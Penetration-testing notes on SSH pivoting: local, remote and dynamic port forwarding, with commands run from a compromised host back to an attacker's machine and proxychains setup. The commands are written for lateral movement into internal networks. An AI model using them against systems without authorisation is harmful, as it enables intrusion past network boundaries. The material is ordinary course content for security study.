## Forward Connections

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target.

There are two ways to create a forward SSH tunnel:
- Port forwarding
- Creating a proxy

## Local Port Forward

> For example, if we had SSH access to 172.16.0.5 and a web server was running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10

On kali:

```sh
ssh -L [bind_address:]port:host:hostport [username@address] -fN
```

```sh
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

## Remote Port Forward
> Reverse Connections

**Reverse connections are entirely possible with the SSH client (and may even be preferable if you have a shell on the compromised server, but no SSH access).**

Before we can establish a reverse connection securely, we must follow a few steps:

1. First, generate a new set of SSH keys and store them in a safe place:

```
ssh-keygen
```

2. Copy the content of the public key `id_rsa.pub`
3. Then edit the `~/.ssh/authorized_keys` file on your own attacking machine. (create it if it doesn't exist)
4. On a new line, type the following line, then paste the public key:

```c
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty {[Content of id_rsa.pub key]}
```

This ensures that the key can only be used for port forwarding, preventing the possibility of getting a shell on your attacking machine.

5. Restart the SSH service

```sh
sudo service ssh restart
```

6. Transfer the private key to the target box. This is why we generated a disposable set of SSH keys to discard as soon as the engagement is over.

7. Once the key is transferred, we can then reconnect with a reverse port forward

```sh
ssh -R [kali-address:]port:host:hostport [kali@kali-address] -fN
```

```sh
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT kali@ATTACKING_IP -i KEYFILE -fN
```

> For example, if we have a shell on 172.16.0.5 and we want to give our attacking box (172.16.0.20) access to the web server on 172.16.0.10, we could use this command on the 172.16.0.5 machine

```bash
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
```

It's also possible to create a reverse proxy in clients that support it:

```sh
ssh -R 1337 kali@ATTACKING_IP -i KEYFILE -fN
```

## Dynamic Port Forwarding (Proxy)

This is useful when combined with a tool such as proxychains.

```sh
ssh -D [address to bind to]:[port to bind to] [user@address] -fN
```

```sh
ssh -D 1337 user@172.16.0.5 -fN
```

```sh
sudo nano /etc/proxychains.conf
	socks4 127.0.0.1 1337
```
